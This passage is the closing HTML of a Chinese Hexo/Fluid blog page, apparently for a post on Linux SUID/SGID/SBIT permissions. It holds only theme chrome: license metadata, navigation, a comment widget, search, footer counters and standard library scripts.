+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年11月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/blog/2022/11/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86-%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4/" title="顶级域名、子域名收集">
+                        <span class="hidden-mobile">顶级域名、子域名收集</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="SOHUCS" sid='https://chujian521.github.io/blog/2022/11/19/Linux%E4%B8%AD%E7%9A%84SUID%E3%80%81SGID%E3%80%81SBIT%E6%9D%83%E9%99%90%E4%BB%8B%E7%BB%8D/'></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#SOHUCS', function() {
+      Fluid.utils.createScript("https://changyan.sohu.com/upload/changyan.js", function() {
+        window.changyan.api.config({"appid":"cywkrFUjM","appkey":"4ccd03889a49ffa3059780af8bbbc0e2"})
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+  <!-- 雪花特效 -->
+  <script type="text/javascript" src="\js\snow.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":300,"height":600},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
